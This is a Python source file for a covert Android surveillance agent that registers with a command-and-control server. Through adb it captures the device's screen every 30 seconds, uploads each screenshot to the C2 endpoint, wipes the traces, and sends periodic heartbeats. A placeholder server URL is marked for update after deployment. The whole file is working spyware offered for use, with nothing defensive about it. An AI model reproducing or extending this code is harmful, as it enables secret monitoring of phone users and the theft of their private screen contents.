import requests
import time
import os
import platform
import subprocess
from datetime import datetime
from threading import Thread

class RealAndroidAgent:
    def __init__(self, agent_id, c2_server):
        self.agent_id = agent_id
        self.c2_server = c2_server
        self.running = True
        self.screenshot_count = 0
        
    def get_device_info(self):
        return {
            'agent_id': self.agent_id,
            'phone_model': platform.node() or 'Unknown',
            'android_version': 'Real Device',
            'timestamp': datetime.now().isoformat()
        }
    
    def register_with_c2(self):
        try:
            info = self.get_device_info()
            response = requests.post(
                f"{self.c2_server}/api/agent/register",
                json=info,
                timeout=10
            )
            print("✅ Registered with C2")
            return True
        except Exception as e:
            print(f"❌ Registration failed: {e}")
            return False
    
    def capture_real_screenshot(self):
        try:
            timestamp = int(time.time())
            remote_file = f"/sdcard/screen_{self.agent_id}_{timestamp}.png"
            local_file = f"screen_{timestamp}.png"
            
            subprocess.run(['adb', 'shell', 'screencap', '-p', remote_file], capture_output=True, timeout=10)
            subprocess.run(['adb', 'pull', remote_file, local_file], capture_output=True, timeout=10)
            
            if os.path.exists(local_file):
                with open(local_file, 'rb') as f:
                    data = f.read()
                os.remove(local_file)
                subprocess.run(['adb', 'shell', 'rm', remote_file], capture_output=True)
                return data
        except Exception as e:
            print(f"Screenshot failed: {e}")
        
        return f"SCREENSHOT_{self.agent_id}_{int(time.time())}".encode()
    
    def upload_screenshot(self):
        try:
            screenshot_data = self.capture_real_screenshot()
            files = {'screenshot': ('screen.jpg', screenshot_data, 'image/jpeg')}
            data = {'agent_id': self.agent_id}
            
            response = requests.post(
                f"{self.c2_server}/api/agent/upload_screenshot",
                files=files,
                data=data,
                timeout=30
            )
            print("📸 Screenshot uploaded")
            return True
        except Exception as e:
            print(f"Upload failed: {e}")
            return False
    
    def start_surveillance(self):
        print("🎯 Starting REAL surveillance...")
        self.register_with_c2()
        
        def monitor_loop():
            while self.running:
                self.upload_screenshot()
                time.sleep(30)
        
        def heartbeat_loop():
            while self.running:
                self.register_with_c2()
                time.sleep(300)
        
        Thread(target=monitor_loop, daemon=True).start()
        Thread(target=heartbeat_loop, daemon=True).start()
        print("✅ Surveillance active")

def main():
    # UPDATE THIS AFTER DEPLOYMENT
    C2_SERVER = "https://your-c2-server.onrender.com"
    AGENT_ID = "phone_007"
    
    agent = RealAndroidAgent(AGENT_ID, C2_SERVER)
    agent.start_surveillance()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        agent.running = False
        print("Agent stopped")

if __name__ == "__main__":
    main()